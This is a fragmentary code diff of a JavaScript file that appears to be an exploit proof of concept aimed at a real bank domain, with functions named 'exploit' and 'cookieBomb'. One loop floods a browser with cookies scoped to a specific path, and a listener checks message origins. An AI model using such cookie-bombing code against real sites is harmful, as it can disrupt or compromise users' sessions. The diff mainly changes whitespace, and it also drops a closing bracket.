@@ -20,7 +20,7 @@ function exploit()
         
     },5000);
 
-});
+
 
    
 
@@ -36,7 +36,7 @@ function cookieBomb()
         document.cookie=`bomb${i}=${p};path=/frontends/files/xd.html;max-age=600;SameSite=None;Secure`;
     }
  debugger;
-window.addEventListener("message", (event) => {
+  window.addEventListener("message", (event) => {
     if (event.origin !== "https://myaccounts.capitalone.com/") {
         console.warn("Response from untrusted origin:", event.origin);
         return;
